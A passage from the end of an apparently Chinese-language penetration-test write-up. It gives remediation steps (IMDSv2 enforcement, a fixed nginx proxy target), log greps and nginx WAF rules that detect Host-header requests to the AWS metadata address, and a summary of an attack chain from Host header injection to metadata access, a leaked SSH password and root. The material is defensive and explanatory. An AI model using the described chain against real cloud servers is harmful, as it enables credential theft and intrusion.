+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 对已有实例启用IMDSv2</span><br>aws ec2 modify-instance-metadata-options \<br>    --instance-id i-xxxxxxxx \<br>    --http-tokens required \<br>    --http-endpoint enabled<br><br><span class="hljs-comment"># 启动新实例时启用</span><br>aws ec2 run-instances \<br>    --metadata-options <span class="hljs-string">&quot;HttpTokens=required&quot;</span><br></code></pre></div></td></tr></table></figure>
+
+<hr>
+<h2 id="8-修复建议"><a href="#8-修复建议" class="headerlink" title="8. 修复建议"></a>8. 修复建议</h2><h3 id="8-1-紧急修复（立即执行）"><a href="#8-1-紧急修复（立即执行）" class="headerlink" title="8.1 紧急修复（立即执行）"></a>8.1 紧急修复（立即执行）</h3><ol>
+<li><p><strong>轮换所有泄露的凭证</strong></p>
+<ul>
+<li>更改服务器root密码</li>
+<li>轮换AWS IAM凭证</li>
+<li>轮换阿里云AK&#x2F;SK</li>
+<li>撤销GitHub Personal Access Token</li>
+</ul>
+</li>
+<li><p><strong>修复Nginx配置</strong></p>
+<figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-comment"># 固定代理目标，不使用Host头</span><br><span class="hljs-attribute">proxy_pass</span> http://127.0.0.1:8080;<br></code></pre></div></td></tr></table></figure>
+</li>
+<li><p><strong>启用IMDSv2</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">aws ec2 modify-instance-metadata-options \<br>  --instance-id i-xxxxxxxx \<br>  --http-tokens required<br></code></pre></div></td></tr></table></figure></li>
+</ol>
+<h3 id="8-2-长期修复"><a href="#8-2-长期修复" class="headerlink" title="8.2 长期修复"></a>8.2 长期修复</h3><ol>
+<li><p><strong>Nginx安全加固</strong></p>
+<ul>
+<li>校验Host头白名单</li>
+<li>使用 <code>$server_name</code> 而非 <code>$http_host</code></li>
+<li>配置 <code>proxy_pass</code> 使用固定地址</li>
+</ul>
+</li>
+<li><p><strong>云安全加固</strong></p>
+<ul>
+<li>启用IMDSv2</li>
+<li>不要在User-Data中存储敏感信息</li>
+<li>使用AWS Secrets Manager管理密码</li>
+<li>IAM角色遵循最小权限原则</li>
+</ul>
+</li>
+<li><p><strong>监控与检测</strong></p>
+<ul>
+<li>监控对 <code>169.254.169.254</code> 的异常请求</li>
+<li>配置WAF规则拦截Host头篡改</li>
+<li>启用CloudTrail记录元数据访问</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="9-防御检测方法"><a href="#9-防御检测方法" class="headerlink" title="9. 防御检测方法"></a>9. 防御检测方法</h2><h3 id="9-1-如何检测Host头注入"><a href="#9-1-如何检测Host头注入" class="headerlink" title="9.1 如何检测Host头注入"></a>9.1 如何检测Host头注入</h3><p><strong>Nginx日志分析</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 查找异常的Host头</span><br>grep <span class="hljs-string">&quot;169.254.169.254&quot;</span> /var/log/nginx/access.log<br>grep -E <span class="hljs-string">&quot;(localhost|127.0.0.1|metadata)&quot;</span> /var/log/nginx/access.log<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>WAF规则</strong>：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-comment"># Nginx层拦截</span><br><span class="hljs-attribute">if</span> (<span class="hljs-variable">$http_host</span> <span class="hljs-regexp">~ &quot;169\.254\.169\.254&quot;)</span> &#123;<br>    <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>;<br>&#125;<br><span class="hljs-attribute">if</span> (<span class="hljs-variable">$http_host</span> <span class="hljs-regexp">~ &quot;(localhost|127\.0\.0\.1|metadata)&quot;)</span> &#123;<br>    <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<h3 id="9-2-如何检测SSRF"><a href="#9-2-如何检测SSRF" class="headerlink" title="9.2 如何检测SSRF"></a>9.2 如何检测SSRF</h3><p><strong>网络流量监控</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 监控对链路本地地址的请求</span><br>tcpdump -i any host 169.254.169.254<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>应用日志</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 检查应用是否发起到元数据服务的请求</span><br>grep <span class="hljs-string">&quot;169.254.169.254&quot;</span> /var/log/app/*.<span class="hljs-built_in">log</span><br></code></pre></div></td></tr></table></figure>
+
+<hr>
+<h2 id="10-总结"><a href="#10-总结" class="headerlink" title="10. 总结"></a>10. 总结</h2><p>本文详细记录了一次从Web应用到服务器Shell的完整渗透过程。攻击者通过以下步骤实现了攻击：</p>
+<ol>
+<li><strong>发现</strong>：信息收集发现Nginx反向代理配置</li>
+<li><strong>突破</strong>：Host头注入漏洞允许访问AWS元数据服务</li>
+<li><strong>提取</strong>：从User-Data中获取SSH密码</li>
+<li><strong>控制</strong>：SSH登录获得服务器root权限</li>
+</ol>
+<p><strong>核心教训</strong>：</p>
+<ul>
+<li>Nginx配置中的 <code>$http_host</code> 变量是危险源，不应直接用于路由</li>
+<li>云元数据服务是SSRF攻击的高价值目标</li>
+<li>User-Data不应包含任何敏感信息</li>
+<li>IMDSv2 应作为云服务器的默认配置</li>
+</ul>
+<p>这个案例再次证明，安全配置的疏忽和云服务的错误使用，可能导致从一个小小的Web漏洞演变为整个云基础设施的沦陷。</p>
+<hr>
+<h2 id="11-参考资源"><a href="#11-参考资源" class="headerlink" title="11. 参考资源"></a>11. 参考资源</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery">OWASP - Server-Side Request Forgery (SSRF)</a></li>
+<li><a target="_blank" rel="noopener" href="https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/ec2-instance-metadata.html">AWS - 实例元数据与用户数据</a></li>
+<li><a target="_blank" rel="noopener" href="https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html">AWS - IMDSv2 迁移指南</a></li>
+<li><a target="_blank" rel="noopener" href="https://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_pass">Nginx 官方文档 - proxy_pass</a></li>
+<li><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2021-3618">CVE-2021-3618</a> - ALPACA攻击（TLS&#x2F;SSL Host头注入）</li>
+</ul>
+<hr>
+<blockquote>
+<p><strong>免责声明</strong>：本文仅用于安全技术研究和防御目的。未经授权对他人系统进行渗透测试是违法行为。请在获得合法授权后进行安全测试。</p>
+</blockquote>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+    
+
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
